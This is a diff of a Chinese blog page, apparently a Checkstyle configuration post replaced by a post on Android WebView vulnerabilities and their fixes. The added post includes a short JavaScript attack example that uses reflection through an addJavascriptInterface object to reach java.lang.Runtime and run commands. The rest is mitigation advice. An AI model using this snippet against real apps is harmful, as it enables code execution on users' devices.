@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="android checkstyle," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -79,18 +79,21 @@
 
 
 
-<meta name="description" content="CheckStyle配置Checkstyle使用Checkstyle是检查java程序代码样式的工具。ide中可以通过checkstyle插件检查代码。 Checkstyle配置是通过指定modules来应用到java文件的。modules是树状结构，以一个名为Checker的module作为root节点，一般的checker都会包括TreeWalker子module。">
-<meta name="keywords" content="android checkstyle">
+<meta name="description" content="任意代码执行漏洞 密码明文存储漏洞 域控制不严格漏洞     任意代码执行漏洞  漏洞产生原因：  webview 中 addJavascriptInterface() 接口 webview 内置导出的 searchBoxJavaBridge_ 对象 webview 内置导出的 accessibility 和 accessibilityTraversalObject 对象    1.addJa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="checkstyle">
-<meta property="og:url" content="http://yoursite.com/2018/02/09/checkstyle/index.html">
+<meta property="og:title" content="webview漏洞">
+<meta property="og:url" content="http://yoursite.com/2018/06/19/webview漏洞/index.html">
 <meta property="og:site_name" content="Erzyb">
-<meta property="og:description" content="CheckStyle配置Checkstyle使用Checkstyle是检查java程序代码样式的工具。ide中可以通过checkstyle插件检查代码。 Checkstyle配置是通过指定modules来应用到java文件的。modules是树状结构，以一个名为Checker的module作为root节点，一般的checker都会包括TreeWalker子module。">
+<meta property="og:description" content="任意代码执行漏洞 密码明文存储漏洞 域控制不严格漏洞     任意代码执行漏洞  漏洞产生原因：  webview 中 addJavascriptInterface() 接口 webview 内置导出的 searchBoxJavaBridge_ 对象 webview 内置导出的 accessibility 和 accessibilityTraversalObject 对象    1.addJa">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-23T05:49:27.125Z">
+<meta property="og:image" content="http://yoursite.com/2018/06/19/webview漏洞/QQ20180619-154545.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/19/webview漏洞/QQ20180619-154629.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/19/webview漏洞/QQ20180619-154648.png">
+<meta property="og:updated_time" content="2018-06-19T07:55:51.032Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="checkstyle">
-<meta name="twitter:description" content="CheckStyle配置Checkstyle使用Checkstyle是检查java程序代码样式的工具。ide中可以通过checkstyle插件检查代码。 Checkstyle配置是通过指定modules来应用到java文件的。modules是树状结构，以一个名为Checker的module作为root节点，一般的checker都会包括TreeWalker子module。">
+<meta name="twitter:title" content="webview漏洞">
+<meta name="twitter:description" content="任意代码执行漏洞 密码明文存储漏洞 域控制不严格漏洞     任意代码执行漏洞  漏洞产生原因：  webview 中 addJavascriptInterface() 接口 webview 内置导出的 searchBoxJavaBridge_ 对象 webview 内置导出的 accessibility 和 accessibilityTraversalObject 对象    1.addJa">
+<meta name="twitter:image" content="http://yoursite.com/2018/06/19/webview漏洞/QQ20180619-154545.png">
 
 
 
@@ -120,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/02/09/checkstyle/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/06/19/webview漏洞/"/>
 
 
 
 
 
-  <title>checkstyle | Erzyb</title>
+  <title>webview漏洞 | Erzyb</title>
   
 
 
@@ -233,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/09/checkstyle/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/19/webview漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Erzyb">
@@ -250,7 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">checkstyle</h1>
+          <h1 class="post-title" itemprop="name headline">webview漏洞</h1>
         
 
         <div class="post-meta">
@@ -262,8 +265,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-09T10:38:46+08:00">
-                2018-02-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-19T10:51:58+08:00">
+                2018-06-19
               </time>
             
 
@@ -300,52 +303,58 @@
       
 
       
-        <h1 id="CheckStyle配置"><a href="#CheckStyle配置" class="headerlink" title="CheckStyle配置"></a>CheckStyle配置</h1><h2 id="Checkstyle使用"><a href="#Checkstyle使用" class="headerlink" title="Checkstyle使用"></a>Checkstyle使用</h2><p>Checkstyle是检查java程序代码样式的工具。ide中可以通过checkstyle插件检查代码。</p>
-<p>Checkstyle配置是通过指定modules来应用到java文件的。modules是树状结构，以一个名为Checker的module作为root节点，一般的checker都会包括TreeWalker子module。</p>
-<a id="more"></a>
-<p>在xml配置文件中通过module的name属性来区分module，module的Properties可以控制如何去执行这个module，每个property都有一个默认值，所有的check都有一个severity属性，用它来指定check的level。TreeWalker为每个java文件创建一个语法树，在节点之间调用submodules的Checks。</p>
-<h2 id="checkstyle具体用法"><a href="#checkstyle具体用法" class="headerlink" title="checkstyle具体用法"></a>checkstyle具体用法</h2><h3 id="Javadoc-Comment-文档规范"><a href="#Javadoc-Comment-文档规范" class="headerlink" title="Javadoc Comment 文档规范"></a>Javadoc Comment 文档规范</h3><ol>
-<li><p>AtclauseOrder</p>
-<p> 检查javadoc块标签或javadoc标签的顺序</p>
-<blockquote>
-<p>violateExecutionOnNonTightHtml</p>
-<p>target</p>
-<p>tagOrder</p>
+        <blockquote>
+<ol>
+<li>任意代码执行漏洞</li>
+<li>密码明文存储漏洞</li>
+<li>域控制不严格漏洞</li>
+</ol>
 </blockquote>
-</li>
-<li><p>JavadocMethod</p>
-<p> 检查方法或构造函数的Javadoc。    </p>
+<hr>
+<ol>
+<li><p>任意代码执行漏洞</p>
+<p> 漏洞产生原因：</p>
+<ol>
+<li>webview 中 <code>addJavascriptInterface()</code> 接口</li>
+<li>webview 内置导出的 <code>searchBoxJavaBridge_</code> 对象</li>
+<li>webview 内置导出的 <code>accessibility</code> 和 <code>accessibilityTraversal</code>Object 对象</li>
+</ol>
 </li>
 </ol>
-<pre><code>name|描述
----|---
-minLineCount|
-allowedAnnotations|
-validateThrows|
-scope|
-excludeScope|
-allowUndeclaredRTE|
-allowThrowsTagsForSubclasses|
-allowMissingParamTags|
-allowMissingThrowsTags|
-allowMissingReturnTag|
-allowMissingJavadoc|
-allowMissingPropertyJavadoc|
-logLoadErrors|
-suppressLoadErrors|
-ignoreMethodNamesRegex|
-tokens|
+<pre><code>1.addJavascriptInterface()
+    分析：
+     ![源码注释](webview漏洞/QQ20180619-151746.png)
+
+    攻击代码示例
+
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function execute(args)&#123;</span><br><span class="line">	//遍历window对象 找到包含getClass()的对象</span><br><span class="line">	for(var obj in window)&#123;</span><br><span class="line">		if(&quot;getClass&quot; in window[obj])&#123;</span><br><span class="line">			//利用反射得到Runtime对象</span><br><span class="line">			alert(obj);</span><br><span class="line">			return window[obj].getClass().forName(&quot;java.lang.Runtime&quot;)</span><br><span class="line">//调用静态方法执行命令</span><br><span class="line">getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(args);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+解决方案：
+在Android 4.2版本以前，使用prompt,console.log,alert方式，这三个方法对js里是属性原生的，在android webview这一层是可以重写这三个方法的。一般我们使用prompt，因为这个在js里使用的不多，用来和native通讯副作用比较少。
+
+2.searchBoxJavaBridge_接口引起远程代码执行漏洞
+
+版本3.0以前webview会默认添加一个searchBoxJavaBridge_对象。
+解决：删除searchBoxJavaBridge_接口 removeJavascriptInterface（）；
+
+3.accessibility和 accessibilityTraversal接口引起远程代码执行漏洞
 </code></pre><ol>
-<li><p>JavadocPackage<br> 检查每个java包是否有说明文档。默认情况下，只允许package-info.java,但可以配置为允许package.html文件。如果两个文件都存在会报告错误。</p>
-<blockquote>
-<p>allowLegacy   是否允许package.html文件</p>
-<p>fileExtensions 文件类型扩展名设置</p>
-</blockquote>
+<li><p>密码明文存储漏洞</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebSettings.setSavePassword(false)</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>JavadocParagraph</p>
-</li>
+<li><p>域控制不严格漏洞</p>
+<p> <img src="/2018/06/19/webview漏洞/QQ20180619-154545.png" alt=""></p>
+<p> <img src="/2018/06/19/webview漏洞/QQ20180619-154629.png" alt=""></p>
+<p> <img src="/2018/06/19/webview漏洞/QQ20180619-154648.png" alt=""></p>
+<p> 建议解决方案：</p>
+<pre><code>1. 对于不需要使用 file 协议的应用，禁用 file 协议；
+2. 对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript
+
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 需要使用 file 协议</span><br><span class="line">setAllowFileAccess(true); </span><br><span class="line">setAllowFileAccessFromFileURLs(false);</span><br><span class="line">setAllowUniversalAccessFromFileURLs(false);</span><br><span class="line"></span><br><span class="line">// 禁止 file 协议加载 JavaScript</span><br><span class="line">if (url.startsWith(&quot;file://&quot;) &#123;</span><br><span class="line"> 			setJavaScriptEnabled(false);</span><br><span class="line">&#125; else &#123;</span><br><span class="line"> 			setJavaScriptEnabled(true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</code></pre></li>
 </ol>
-<h3 id="Naming-Conventions"><a href="#Naming-Conventions" class="headerlink" title="Naming Conventions"></a>Naming Conventions</h3><h3 id="Imports"><a href="#Imports" class="headerlink" title="Imports"></a>Imports</h3><h3 id="Size-Violations"><a href="#Size-Violations" class="headerlink" title="Size Violations"></a>Size Violations</h3><h3 id="Whitespace"><a href="#Whitespace" class="headerlink" title="Whitespace"></a>Whitespace</h3><h3 id="ModifierOrder"><a href="#ModifierOrder" class="headerlink" title="ModifierOrder"></a>ModifierOrder</h3><h3 id="Block-Checks"><a href="#Block-Checks" class="headerlink" title="Block Checks"></a>Block Checks</h3><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h3><h3 id="Class-Design"><a href="#Class-Design" class="headerlink" title="Class Design"></a>Class Design</h3><h3 id="Duplicate-Code"><a href="#Duplicate-Code" class="headerlink" title="Duplicate Code"></a>Duplicate Code</h3><h3 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h3>
+
       
     </div>
     
@@ -360,12 +369,6 @@ tokens|
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/android-checkstyle/" rel="tag"># android checkstyle</a>
-          
-        </div>
-      
 
       
       
@@ -375,8 +378,8 @@ tokens|
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/07/git版本控制总结/" rel="next" title="git版本控制总结">
-                <i class="fa fa-chevron-left"></i> git版本控制总结
+              <a href="/2018/03/22/夜间模式实现整理/" rel="next" title="夜间模式实现整理">
+                <i class="fa fa-chevron-left"></i> 夜间模式实现整理
               </a>
             
           </div>
@@ -384,10 +387,6 @@ tokens|
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/22/2018目标/" rel="prev" title="2018目标">
-                2018目标 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -439,17 +438,8 @@ tokens|
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -520,22 +510,6 @@ tokens|
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CheckStyle配置"><span class="nav-number">1.</span> <span class="nav-text">CheckStyle配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Checkstyle使用"><span class="nav-number">1.1.</span> <span class="nav-text">Checkstyle使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checkstyle具体用法"><span class="nav-number">1.2.</span> <span class="nav-text">checkstyle具体用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Javadoc-Comment-文档规范"><span class="nav-number">1.2.1.</span> <span class="nav-text">Javadoc Comment 文档规范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Naming-Conventions"><span class="nav-number">1.2.2.</span> <span class="nav-text">Naming Conventions</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Imports"><span class="nav-number">1.2.3.</span> <span class="nav-text">Imports</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Size-Violations"><span class="nav-number">1.2.4.</span> <span class="nav-text">Size Violations</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Whitespace"><span class="nav-number">1.2.5.</span> <span class="nav-text">Whitespace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ModifierOrder"><span class="nav-number">1.2.6.</span> <span class="nav-text">ModifierOrder</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Block-Checks"><span class="nav-number">1.2.7.</span> <span class="nav-text">Block Checks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coding"><span class="nav-number">1.2.8.</span> <span class="nav-text">Coding</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Class-Design"><span class="nav-number">1.2.9.</span> <span class="nav-text">Class Design</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Duplicate-Code"><span class="nav-number">1.2.10.</span> <span class="nav-text">Duplicate Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Miscellaneous"><span class="nav-number">1.2.11.</span> <span class="nav-text">Miscellaneous</span></a></li></ol></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
